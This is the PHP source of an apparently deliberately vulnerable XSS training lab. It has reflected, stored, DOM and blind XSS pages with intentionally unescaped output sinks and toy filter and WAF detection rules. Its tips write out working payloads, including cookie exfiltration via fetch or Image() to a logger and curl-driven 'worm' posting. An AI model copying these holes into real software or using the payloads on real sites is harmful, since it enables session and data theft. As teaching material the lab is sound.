<?php
// index.php - XSS teaching lab (single-file router)
require_once __DIR__ . '/init_db.php';
$dbfile = __DIR__ . '/db.sqlite';
$db = new PDO('sqlite:' . $dbfile);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$page = $_GET['page'] ?? 'home';

// server-side basic filter levels for the Filter Lab
function filter_input_level($input, $level){
    if ($level === 'none') return $input;
    if ($level === 'naive') {
        // naive strip of <script> tags and common event handlers
        $out = preg_replace('#<\s*script[^>]*>(.*?)<\s*/\s*script>#is','',$input);
        $out = preg_replace('#on[a-z]+\s*=\s*["\'].*?["\']#is','',$out);
        return $out;
    }
    if ($level === 'strip_tags') {
        return strip_tags($input);
    }
    if ($level === 'strip_attributes') {
        $out = preg_replace('/\son[a-z]+\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)/i', '', $input);
        $out = preg_replace('/\s(style|formaction|srcdoc|xlink:href)\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)/i', '', $out);
        $out = preg_replace('/javascript:\s*/i', '', $out);
        return $out;
    }
    if ($level === 'tag_whitelist') {
        $allowed = '<b><strong><i><em><code><a><p><ul><ol><li><span><div>';
        $out = strip_tags($input, $allowed);
        $out = preg_replace('/\son[a-z]+\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)/i', '', $out);
        return $out;
    }
    if ($level === 'encode') {
        return htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    if ($level === 'double_encode') {
        return htmlspecialchars(htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    if ($level === 'regex') {
        // remove <, > and javascript: pseudo-protocol occurrences
        $out = preg_replace('/<|>|javascript:/i','',$input);
        return $out;
    }
    if ($level === 'json_escape') {
        return json_encode($input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
    }
    // default fallback
    return $input;
}

function waf_process($input, $level){
    $response = [
        'allowed' => true,
        'reason' => 'No blocking rules triggered.',
        'transformed' => $input,
        'triggers' => []
    ];
    $normalized = strtolower($input);
    if ($level === 'basic') {
        if (preg_match('/<\s*script|on[a-z]+\s*=|javascript:/i', $input)){
            $response['allowed'] = false;
            $response['reason'] = 'Matched classic script tag, event handler or javascript: URI keyword.';
            $response['triggers'][] = 'script/event handler keyword';
        }
        return $response;
    }
    if ($level === 'balanced') {
        if (preg_match('/document\.|window\.|fetch\(|xmlhttprequest|on[a-z]+\s*=|<\s*script/i', $normalized)){
            $response['allowed'] = false;
            $response['reason'] = 'Behavioral rule blocked DOM API or event handler usage.';
            $response['triggers'][] = 'DOM API keyword';
        }
        if ($response['allowed'] && preg_match('/<\s*img|<\s*svg|<\s*iframe/i', $input)){
            $response['transformed'] = preg_replace('/<\s*(img|svg|iframe)/i', '&lt;$1', $input);
            $response['reason'] = 'Stripped dangerous tag angle brackets but allowed request.';
        }
        return $response;
    }
    if ($level === 'paranoid') {
        if (preg_match('/(%3c|<).*?(%3e|>)/i', $input)){
            $response['allowed'] = false;
            $response['reason'] = 'Blocked because encoded or raw angle brackets detected.';
            $response['triggers'][] = 'Angle bracket pattern';
        }
        if ($response['allowed'] && preg_match('/(alert|prompt|confirm|fetch|on[a-z]+|src=)/i', $normalized)){
            $response['allowed'] = false;
            $response['reason'] = 'Heuristic blocked suspicious JavaScript keywords.';
            $response['triggers'][] = 'Suspicious keyword';
        }
        if ($response['allowed']){
            $response['transformed'] = htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            $response['reason'] = 'Payload passed after full HTML encoding.';
        }
        return $response;
    }
    return $response;
}

// helper for rendering header
function render_xp_hud(){
    echo '<div class="xp-hud" data-xp-hud>'; // container for XP tracker
    echo '<div class="xp-hud-info">';
    echo '<div class="xp-hud-level" id="xp-level">Level 1</div>';
    echo '<div class="xp-hud-total" id="xp-total">0 XP</div>';
    echo '</div>';
    echo '<div class="xp-hud-progress">';
    echo '<div class="xp-progress-bar"><div class="xp-progress-fill" id="xp-progress-fill" role="progressbar" aria-valuemin="0" aria-valuemax="100"></div></div>';
    echo '<button type="button" class="button xp-reset" id="xp-reset">Reset XP</button>';
    echo '</div>';
    echo '</div>';
}

function xp_marker($id, $label, $xp = 25){
    $idAttr = htmlspecialchars($id, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $labelEsc = htmlspecialchars($label, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $xpVal = (int)$xp;
    echo '<div class="xp-marker" data-xp-id="'.$idAttr.'" data-xp-award="'.$xpVal.'">';
    echo '<div class="xp-marker-body">';
    echo '<div class="xp-marker-label">'.$labelEsc.'</div>';
    echo '<button type="button" class="button xp-button">Mark complete (+' . $xpVal . ' XP)</button>';
    echo '</div>';
    echo '<div class="xp-marker-status" aria-live="polite"></div>';
    echo '</div>';
}

function tip_vault($id, $cost, $title, $groups = []){
    $idAttr = htmlspecialchars($id, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $titleEsc = htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $costVal = max(0, (int)$cost);
    echo '<div class="tip-vault" data-tip-vault data-tip-id="'.$idAttr.'" data-tip-cost="'.$costVal.'">';
    echo '<div class="tip-vault-header">';
    echo '<div class="tip-vault-title">'.$titleEsc.'</div>';
    echo '<div class="tip-vault-meta">Cost: '.$costVal.' XP</div>';
    echo '</div>';
    echo '<div class="tip-vault-status" data-tip-status>Tips are locked. Spend XP when you truly need guidance.</div>';
    echo '<button type="button" class="button tip-vault-button" data-tip-toggle>Unlock tips (-'.$costVal.' XP)</button>';
    echo '<div class="tip-vault-body" data-tip-body hidden>';
    foreach ($groups as $group){
        echo '<div class="tip-vault-tip">';
        if (!empty($group['title'])){
            echo '<div class="tip-vault-tip-title">'.htmlspecialchars($group['title'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div>';
        }
        if (!empty($group['body'])){
            echo '<div class="tip-vault-tip-body small">'.$group['body'].'</div>';
        }
        if (!empty($group['items']) && is_array($group['items'])){
            echo '<ul class="tip-vault-list small">';
            foreach ($group['items'] as $item){
                echo '<li>'.$item.'</li>';
            }
            echo '</ul>';
        }
        echo '</div>';
    }
    echo '</div>';
    echo '</div>';
}

function header_html($title='XSS Lab', $active='home'){
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'.htmlspecialchars($title).'</title>';
    echo '<link rel="stylesheet" href="styles.css">';
    echo '</head><body class="app-shell">';
    echo '<div class="background-glow"></div><div class="background-grid"></div>';
    echo '<div class="container">';
    // sidebar
    echo '<aside class="sidebar card">';
    echo '<div class="logo">The XSS Rat — XSS Lab</div>';
    echo '<div class="sidebar-intro small">Pick a track to explore a specific XSS vector. Each lab walks you through reconnaissance, exploitation and reflection steps.</div>';
    echo '<nav class="sidebar-nav">';
    $tabs = [
        'home'=>'Home overview',
        'fundamentals'=>'Foundations & concepts',
        'reflected'=>'Reflected XSS',
        'stored'=>'Stored XSS',
        'dom'=>'DOM XSS',
        'blind'=>'Blind XSS',
        'filter'=>'Filter lab',
        'contexts'=>'Contexts explorer',
        'playground'=>'Practice playground',
        'waf'=>'WAF bypass lab',
        'bypasses'=>'Bypass library'
    ];
    foreach ($tabs as $k=>$v){
        $classes = 'nav-item button';
        if ($k === $active) {
            $classes .= ' is-active';
        }
        echo '<a class="'.$classes.'" href="#" data-page="'.htmlspecialchars($k).'">'.htmlspecialchars($v).'</a>';
    }
    echo '</nav>';
    echo '<div class="sidebar-footer small">Warning: intentionally vulnerable. Run locally.</div>';
    echo '</aside>'; // sidebar end
    echo '<main class="main-column">';
    echo '<div class="card surface-card">';
    echo '<div class="lab-title">'.htmlspecialchars($title).'</div>';
    render_xp_hud();
}

// footer
function footer_html(){
    echo '</div>'; // card
    echo '</main>'; // main column
    echo '</div>'; // container
    echo '<script src="app.js"></script>';
    echo '</body></html>';
}

// ROUTES
if ($page === 'home'){
    header_html('Home — XSS Lab', 'home');
    echo '<div class="hero">';
    echo '<div class="hero-title">Start from zero knowledge and grow into an XSS practitioner.</div>';
    echo '<div class="hero-body small">Follow the learning path: absorb the web fundamentals, practise every XSS flavour with checklists, then solidify your skills inside the sandbox playground.</div>';
    echo '</div>';
    xp_marker('home-orientation', 'Reviewed the home orientation and learning path', 15);
    echo '<div class="meta meta-columns intro-columns">';
    echo '<div><strong>What you will learn</strong><div class="small">Understand how browsers build the Document Object Model (DOM), how HTML tags and attributes shape a page, and how JavaScript interacts with those nodes. Each lab references these ideas so you can connect theory with the exploit workflow.</div></div>';
    echo '<div><strong>Suggested learning order</strong><ol class="lab-steps"><li>Foundations &amp; concepts</li><li>Reflected, stored and DOM XSS labs</li><li>Filter lab + Contexts explorer</li><li>Playground scenarios and custom experiments</li></ol></div>';
    echo '<div><strong>Practice mindset</strong><div class="small">Treat every section like an assessment: take notes, sketch payload variants, and capture lessons learned in your notebook so you leave ready to reproduce the attacks elsewhere.</div></div>';
    echo '</div>';
    echo '<div class="lab-grid">';
    $cards = [
        ['fundamentals','Foundations &amp; concepts','Build the mental model for HTML, the DOM and JavaScript before touching payloads.'],
        ['reflected','Reflected XSS','Spot input parameters that echo immediately and craft payloads that execute on first load.'],
        ['stored','Stored XSS','Persist malicious markup inside databases or comments and watch it execute for every visitor.'],
        ['dom','DOM XSS','Manipulate client-side JavaScript sinks such as <code>innerHTML</code> and URL fragments.'],
        ['blind','Blind XSS','Plant payloads that phone home to the blind logger to prove execution in remote panels.'],
        ['filter','Filter Lab','Experiment with increasingly strict server-side filters and learn reliable bypasses.'],
        ['contexts','Contexts','See how the same payload behaves in HTML, attributes, JS, CSS and URL contexts.'],
        ['playground','Playground','Apply everything you learned across multiple realistic mini applications.'],
        ['waf','WAF bypass lab','Drill WAF evasion strategies across multiple inspection levels with guided lectures.'],
        ['bypasses','Bypasses','Browse a curated list of payloads ranked from beginner friendly to advanced evasions.'],
    ];
    foreach ($cards as $card){
        echo '<a class="lab-card" href="#" data-page="'.htmlspecialchars($card[0]).'"><div class="lab-card-title">'.htmlspecialchars($card[1]).'</div><div class="lab-card-body small">'.$card[2].'</div><div class="lab-card-action">Start lab →</div></a>';
    }
    echo '</div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>How to use these labs</strong><ol class="lab-steps"><li>Read the scenario to understand the application behaviour.</li><li>Use the checklist to experiment and note the results.</li><li>Capture payloads that work so you can reuse them later.</li><li>Reflect on how filters and contexts influenced the payload.</li></ol></div>';
    echo '<div><strong>Recommended toolkit</strong><ul class="lab-list"><li>Browser devtools (Elements + Console + Network)</li><li>Interception proxy (Burp, OWASP ZAP)</li><li>Custom payload scratchpad or local text editor</li><li>Notes on HTML tags, JS APIs and DOM properties you discover</li></ul></div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'fundamentals'){
    header_html('Foundations & concepts', 'fundamentals');
    echo '<div class="section"><div class="section-title">Welcome to the web stack</div><div class="small">Before throwing payloads at inputs, understand how browsers interpret HTML, build the Document Object Model (DOM) and execute JavaScript. This foundation lets you reason about where user-controlled data travels.</div></div>';
    xp_marker('fundamentals-overview', 'Studied the foundations and concepts overview', 20);
    echo '<div class="section"><div class="section-title">HTML: the structure layer</div><div class="small">HyperText Markup Language describes the layout of a page using nested tags. Each tag can carry attributes that store extra data. Browsers parse these tags into DOM nodes.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>HTML essentials</strong><ul class="lab-list"><li><code>&lt;tag&gt;content&lt;/tag&gt;</code> wraps text or other elements.</li><li>Attributes like <code>href="..."</code> or <code>onclick="..."</code> live inside the opening tag.</li><li>Void elements (e.g. <code>&lt;img&gt;</code>) have no closing tag and are common XSS sinks via attributes.</li></ul></div>';
    echo '<div><strong>Example document outline</strong><div class="bypass-list">&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;... metadata ...&lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Title&lt;/h1&gt;\n    &lt;a href="/profile?id=7"&gt;Profile&lt;/a&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</div></div>';
    echo '<div><strong>Why attackers care</strong><div class="small">If you can inject HTML, you can add new tags or attributes. That may give you a place to execute JavaScript (via <code>&lt;script&gt;</code>, event handlers, or dangerous URLs).</div></div>';
    echo '</div>';
    echo '<div class="interactive-block">';
    echo '<div class="section-title">Try it: render HTML vs. escaped text</div>';
    echo '<div class="small">Type markup to see how browsers build DOM nodes. You will get both the live rendered version and an escaped, safe string for comparison.</div>';
    echo '<div class="fundamentals-playground" data-fundamentals-playground>';
    echo '<label class="small" for="fundamentals-html-input">Type some HTML</label>';
    echo '<textarea id="fundamentals-html-input" class="input fundamentals-input" data-fundamentals-input placeholder="e.g. &lt;img src=x onerror=alert(1)&gt;">&lt;p&gt;Hello DOM! Try injecting &lt;strong&gt;bold&lt;/strong&gt; text or an &lt;img onerror=alert(1)&gt; payload.&lt;/p&gt;</textarea>';
    echo '<div class="fundamentals-playground-actions">';
    echo '<button type="button" class="button" data-fundamentals-render>Render snippet</button>';
    echo '<button type="button" class="button button-secondary" data-fundamentals-reset>Reset</button>';
    echo '</div>';
    echo '<div class="fundamentals-playground-results">';
    echo '<div class="fundamentals-preview">';
    echo '<div class="fundamentals-preview-label">Rendered DOM</div>';
    echo '<div class="fundamentals-preview-surface" data-fundamentals-preview></div>';
    echo '</div>';
    echo '<div class="fundamentals-preview">';
    echo '<div class="fundamentals-preview-label">Escaped string</div>';
    echo '<pre class="fundamentals-preview-surface" data-fundamentals-escaped></pre>';
    echo '</div>';
    echo '</div>';
    echo '<div class="small fundamentals-tip" data-fundamentals-tip>✅ Keep experimenting until the rendered DOM matches what you expect.</div>';
    echo '</div>';
    echo '</div>';
    tip_vault('tips-fundamentals', 5, 'Foundations cheat sheet', [
        [
            'title' => 'HTML probing routine',
            'items' => [
                "Type <code>&lt;em&gt;test&lt;/em&gt;</code> into the textarea and select “Render snippet” to watch the DOM update immediately.",
                "Swap the value for <code>&lt;img src=x onerror=alert(1)&gt;</code> to confirm that event handler payloads execute the moment they render."
            ]
        ],
        [
            'title' => 'Inspect the generated nodes',
            'items' => [
                "Open DevTools → Elements and click the rendered preview. You will see the same structure that the playground shows inside <code>innerHTML</code>.",
                "In the Console, run <code>document.querySelector('.fundamentals-preview-surface').innerHTML</code> to read the raw HTML string the browser executes."
            ]
        ],
        [
            'title' => 'Key takeaway',
            'body' => 'Whatever you type is assigned straight to <code>innerHTML</code> with zero sanitisation. Any valid HTML or JavaScript you inject will run exactly as it would inside a vulnerable application.'
        ]
    ]);
    echo '<div class="section"><div class="section-title">The DOM: live objects representing the page</div><div class="small">When a browser parses HTML it creates a tree of nodes. JavaScript APIs manipulate this tree. Understanding node properties helps you predict where injected strings will land.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Key DOM terms</strong><ul class="lab-list"><li><em>Element nodes</em>: correspond to HTML tags and expose properties like <code>innerHTML</code> and <code>attributes</code>.</li><li><em>Text nodes</em>: represent literal text between tags.</li><li><em>Events</em>: actions like <code>click</code> or <code>load</code> that trigger handlers attached to nodes.</li></ul></div>';
    echo '<div><strong>Inspecting the DOM</strong><div class="small">Open browser devtools → Elements tab. Hover over nodes to see their relationships. Right-click to edit HTML live and observe how the DOM updates instantly.</div><div class="callout">Challenge: change a button label by editing <code>innerText</code> in the console.</div></div>';
    echo '<div><strong>DOM sinks that matter</strong><ul class="lab-list"><li><code>innerHTML</code> and <code>outerHTML</code> interpret strings as HTML.</li><li><code>document.write()</code> injects raw markup during page load.</li><li>Setting <code>href</code>, <code>src</code> or <code>data-*</code> attributes can trigger navigation or fetches.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">JavaScript: behaviour layer</div><div class="small">Scripts run after the DOM exists (or as it loads) and can read, modify or execute strings. XSS aims to control this execution path.</div></div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>Quick JavaScript primer</strong><ul class="lab-list"><li>Variables store data: <code>const payload = location.search;</code></li><li>Functions encapsulate behaviour: <code>function show(msg) { alert(msg); }</code></li><li>The DOM API is available via <code>document</code> and <code>window</code>.</li></ul></div>';
    echo '<div><strong>Common vulnerable patterns</strong><div class="bypass-list">// Taking user input\nconst hash = location.hash.substring(1);\n// Writing it without escaping\ndocument.getElementById("content").innerHTML = decodeURIComponent(hash);</div><div class="small">Any user can control <code>location.hash</code> by editing the URL, so the resulting HTML executes.</div></div>';
    echo '<div><strong>Essential browser APIs</strong><ul class="lab-list"><li><code>alert()</code> for proof-of-concept.</li><li><code>fetch()</code> or <code>XMLHttpRequest</code> for exfiltration.</li><li><code>localStorage</code>, <code>document.cookie</code> to read stored secrets.</li></ul></div>';
    echo '</div>';
    echo '<div class="section"><div class="section-title">Linking concepts to the labs</div><div class="small">With these basics you can reason about the attack surface: identify where HTML is generated, which DOM sinks are in play, and how JavaScript might execute injected data. Move on to the Reflected XSS lab and deliberately trace each step from input to sink.</div></div>';
    echo '<div class="meta"><strong>Next steps</strong><ol class="lab-steps"><li>Use the Reflected XSS lab to practice following a value from request → response → DOM.</li><li>Repeat for Stored XSS and note the persistence layer.</li><li>Revisit this page whenever a concept feels fuzzy—treat it like your personal glossary.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'reflected'){
    header_html('Reflected XSS', 'reflected');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Classic reflected XSS happens when user input is immediately returned in the HTTP response. Use the form below to trace the data flow and capture a working payload.</div></div>';
    xp_marker('reflected-first-payload', 'Executed a reflected XSS payload', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Map the reflected parameter using ?page=reflected&amp;q=test and observe the response.</li><li>Confirm raw HTML injection by attempting harmless tags like <code>&lt;em&gt;</code>.</li><li>Escalate to JavaScript execution with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or event handler payloads.</li><li>Experiment with filter bypasses such as breaking out of attributes or using <code>&lt;img src onerror=alert(1)&gt;</code>.</ol></div>';
    // echo back GET param 'q' unsafely
    $q = $_GET['q'] ?? '';
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="reflected">';
    echo '<div class="form-row"><input class="input" name="q" data-field="q" placeholder="Enter text to reflect"><span class="input-hint">Tip: start simple, then move to payloads.</span></div>';
    echo '<div class="form-row"><button class="button">Submit &amp; observe response</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="q"><strong>Reflected input</strong><div class="small">The value of <code>q</code> is injected directly into the DOM without encoding. Any HTML/JS you submit will render immediately.</div><div class="callout">Track the request in your proxy to practice identifying vulnerable parameters in the wild.</div></div></div>';
    tip_vault('tips-reflected', 8, 'Reflected XSS field guide', [
        [
            'title' => 'Confirm the reflection',
            'items' => [
                "Load <code>?page=reflected&amp;q=%3Cspan%3Eprobe%3C/span%3E</code> and inspect the Network tab to see your markup echoed inside the response.",
                "Open “View Source” and search for <code>probe</code>. It appears inside the results container untouched, proving the sink is raw HTML."
            ]
        ],
        [
            'title' => 'Pop an alert fast',
            'items' => [
                "Submit <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or the shorter <code>&lt;img src=x onerror=alert(1)&gt;</code> to trigger code execution immediately.",
                "If a payload is blocked, switch to an attribute escape such as <code>&quot; onmouseover=alert(document.cookie) x=&quot;</code>."
            ]
        ],
        [
            'title' => 'Demonstrate impact',
            'items' => [
                "Replace <code>alert()</code> with <code>fetch('/blind_logger.php?p=' + encodeURIComponent(document.cookie))</code> to show data exfiltration.",
                "Capture the working payload for reuse in the playground Scenario 1—they share the same reflection pattern."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Raw response fragment</div><div class="results-body">';
    // intentionally vulnerable echo
    echo $q;
    echo '</div></div>';
    footer_html();
    exit;
}

if ($page === 'stored'){
    header_html('Stored XSS', 'stored');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Stored (persistent) XSS abuses server-side storage such as databases or comment systems. Inputs are saved and replayed to all viewers without sanitisation.</div></div>';
    xp_marker('stored-exploit', 'Delivered a stored XSS payload', 35);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Publish a benign message and verify it appears below.</li><li>Inject HTML to validate that markup is preserved in storage.</li><li>Store a script payload so it runs when the page renders.</li><li>Refine your payload to steal cookies or demonstrate impact via the console.</li></ol></div>';
    // handle posting messages into sqlite
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['title'])){
        $st = $db->prepare('INSERT INTO stored_messages (title, body) VALUES (:t,:b)');
        $st->execute([':t'=>$_POST['title'], ':b'=>$_POST['body']]);
        echo '<div class="notice success">Entry stored! Scroll down to see it render unsafely.</div>';
    }
    echo '<form method="POST" action="?page=stored">';
    echo '<div class="form-row"><input class="input" name="title" data-field="title" placeholder="Message title"><span class="input-hint">Example: Friendly greeting</span></div>';
    echo '<div class="form-row"><textarea class="input" name="body" data-field="body" placeholder="Message body (try XSS payloads)" rows="4"></textarea><span class="input-hint">Payload idea: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></div>';
    echo '<div class="form-row"><button class="button">Save message</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="body"><strong>Stored messages</strong><div class="small">Messages are stored in SQLite and printed back without sanitisation. Anyone viewing this list will execute your payload.</div><div class="callout">Try automating with curl to simulate a worm dropping multiple entries.</div></div></div>';
    tip_vault('tips-stored', 9, 'Stored XSS playbook', [
        [
            'title' => 'Verify persistence',
            'items' => [
                "Submit a harmless entry, reload the page and confirm the text is still present—this proves the data is saved in the database.",
                "Check DevTools → Network after posting. The response includes your message body verbatim, meaning there is no server-side encoding."
            ]
        ],
        [
            'title' => 'Land a reliable payload',
            'items' => [
                "Store <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code> in the body field—the page renders it on every visit.",
                "Use multi-line payloads (e.g. auto-submitting forms) because the textarea preserves newline characters."
            ]
        ],
        [
            'title' => 'Demonstrate impact quickly',
            'items' => [
                "Have the script call <code>fetch('/blind_logger.php?p=' + encodeURIComponent(document.cookie))</code> to leak visitor cookies.",
                "Drop multiple entries with <code>curl</code> or Burp Intruder to simulate a worm that spreads through the shoutbox."
            ]
        ]
    ]);
    echo '<div class="results">';
    $rows = $db->query('SELECT id,title,body,created_at FROM stored_messages ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-bottom:1px solid rgba(255,255,255,0.02);padding:8px;margin-bottom:8px">';
        echo '<div class="small">#'.intval($r['id']).' - '.htmlspecialchars($r['created_at']).' - <strong>'.htmlspecialchars($r['title']).'</strong></div>';
        // UNSAFE: render body raw to demonstrate XSS
        echo '<div style="margin-top:6px">'. $r['body'] .'</div>';
        echo '</div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'dom'){
    header_html('DOM XSS', 'dom');
    // example using location.hash insertion into innerHTML
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">DOM-based XSS executes entirely in the browser when JavaScript reads untrusted data and writes it to a sink without sanitising.</div></div>';
    xp_marker('dom-sink', 'Abused a DOM XSS sink', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Review the inline script to identify the sink (<code>innerHTML</code>).</li><li>Modify the hash using the control below or straight in the URL bar.</li><li>Observe how the sink renders decoded content from <code>location.hash</code>.</li><li>Deliver payloads such as <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> and watch them fire.</li></ol></div>';
    echo '<div class="form-row"><input class="input" id="dom-input" data-field="dom-input" placeholder="Change the URL hash or try a payload"><span class="input-hint">Hint: hashes are URL encoded. Use %3C for &lt;.</span></div>';
    echo '<div class="form-row"><button class="button" onclick="location.hash = document.getElementById(\'dom-input\').value">Set hash</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="dom-input"><strong>DOM sink</strong><div class="small">The script listens to <code>hashchange</code> and writes the decoded hash straight into <code>innerHTML</code>.</div><div class="callout">Open DevTools → Sources to inspect the live JavaScript as you test payloads.</div></div></div>';
    tip_vault('tips-dom', 8, 'DOM XSS navigator', [
        [
            'title' => 'Understand the sink',
            'items' => [
                "View the inline script and note the <code>decodeURIComponent(location.hash.substring(1))</code> call—it feeds directly into <code>innerHTML</code>.",
                "Use the Console to run <code>render()</code> manually after changing <code>location.hash</code> to see the same flow executed."
            ]
        ],
        [
            'title' => 'Deliver the payload',
            'items' => [
                "Set the hash to <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E</code> using the input or edit the URL bar directly.",
                "Because hashes are URL-encoded, remember to encode <code>&lt;</code> as <code>%3C</code> and spaces as <code>%20</code>."
            ]
        ],
        [
            'title' => 'Escalate the scenario',
            'items' => [
                "Replace <code>alert()</code> with a call to <code>fetch</code> or <code>localStorage</code> access to show real impact.",
                "Capture the working hash and reuse it in Playground Scenarios 8 and 12—they use the same pattern of decoding a fragment."
            ]
        ]
    ]);
    echo '<div class="results"><div class="results-title">Rendered hash content</div><div id="dom-sink" class="results-body">Hash will be shown here</div></div>';
    echo '<script>
(function(){
  var el = document.getElementById("dom-sink");
  // intentionally unsafe: writes location.hash into innerHTML
  function render(){ el.innerHTML = location.hash ? decodeURIComponent(location.hash.substring(1)) : "(no hash)"; }
  window.addEventListener("hashchange", render);
  render();
})();
</script>';
    footer_html();
    exit;
}

if ($page === 'blind'){
    header_html('Blind XSS', 'blind');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Blind XSS payloads execute on a separate system (e.g. admin panel) and cannot be observed directly. Instead, the payload must exfiltrate to a controlled endpoint like the logger below.</div></div>';
    xp_marker('blind-callback', 'Captured a blind XSS callback', 40);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Craft a payload that makes an outbound request to <code>/blind_logger.php</code>.</li><li>Deliver the payload to a hypothetical support system or admin portal.</li><li>Monitor the log to confirm when an unsuspecting victim loads it.</li><li>Extract contextual data (cookies, DOM, CSRF tokens) in the payload and send them to the logger.</li></ol></div>';
    echo '<form method="GET" action="?page=blind"><div class="form-row"><input class="input" name="payload" data-field="payload" placeholder="Example: &lt;img src=\'/blind_logger.php?p=1\'&gt;"><span class="input-hint">Try using fetch or new Image() for stealth.</span></div><div class="form-row"><button class="button">Preview payload</button></div></form>';
    $payload = $_GET['payload'] ?? '';
    if ($payload){
        echo '<div class="meta"><strong>Payload</strong><div class="small">Use this payload on the target application. When executed, it will call back to the logger below.</div><div class="callout">Shareable payload idea: <code>&lt;script&gt;new Image().src="/blind_logger.php?p="+encodeURIComponent(document.cookie)&lt;/script&gt;</code></div></div>';
        echo '<div class="results"><div class="results-title">Payload preview</div><div class="bypass-list">'.htmlspecialchars($payload).'</div></div>';
    }
    tip_vault('tips-blind', 10, 'Blind XSS operations brief', [
        [
            'title' => 'Craft the callback',
            'items' => [
                "Use <code>&lt;script&gt;new Image().src='/blind_logger.php?p='+encodeURIComponent(document.cookie)&lt;/script&gt;</code> as a baseline—<code>Image()</code> works even when scripts are filtered.",
                "Encode dangerous characters if the target expects HTML entities. The logger simply records whatever query string arrives."
            ]
        ],
        [
            'title' => 'Verify the logger',
            'items' => [
                "After sending the payload to a victim surface, watch the “Recent blind hits” section for a new entry with your <code>p=</code> parameter.",
                "Trigger a manual callback by visiting <code>/blind_logger.php?p=test</code> in another tab to ensure the logging path works before delivering the real exploit."
            ]
        ],
        [
            'title' => 'Collect rich context',
            'items' => [
                "Append DOM data to the payload: <code>encodeURIComponent(document.location)</code>, <code>document.cookie</code>, and any CSRF tokens you can grab.",
                "Store successful payloads in the bypass library so you can reuse the same callback across future blind targets."
            ]
        ]
    ]);
    echo '<div style="margin-top:12px" class="card"><div class="section-title">Recent blind hits</div><div class="small">Each entry represents an HTTP request made by a victim’s browser when your payload executed.</div>';
    $rows = $db->query('SELECT id,created_at,remote_addr,user_agent,params FROM blind_hits ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-top:1px solid rgba(255,255,255,0.02);padding:8px;margin-top:8px"><div class="small">#'.intval($r['id']).' '.htmlspecialchars($r['created_at']).' from '.htmlspecialchars($r['remote_addr']).'</div>';
        echo '<div class="small">UA: '.htmlspecialchars($r['user_agent']).'</div>';
        echo '<div class="bypass-list">'.htmlspecialchars($r['params']).'</div></div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'filter'){
    $allowedLevels = ['none','naive','strip_tags','strip_attributes','tag_whitelist','regex','encode','double_encode','json_escape'];
    $level = $_GET['level'] ?? 'none';
    if ($_SERVER['REQUEST_METHOD'] === 'POST'){
        $postedLevel = $_POST['level'] ?? $_POST['level_select'] ?? null;
        if ($postedLevel !== null && in_array($postedLevel, $allowedLevels, true)){
            $level = $postedLevel;
        }
    }
    if (!in_array($level, $allowedLevels, true)){
        $level = 'none';
    }
    $levelQuery = urlencode($level);
    header_html('Filter Lab', 'filter');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Use the filter lab to understand how different server-side defences behave. Submit payloads and compare the raw, filtered and rendered output.</div></div>';
    xp_marker('filter-bypass', 'Bypassed a filter level', 35);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Select a filter level to see how it transforms your input.</li><li>Test known payloads from the bypass library against each level.</li><li>Document which encodings or transformations defeat the filter.</li><li>Consider the impact if the filtered output is placed into various contexts.</li></ol></div>';
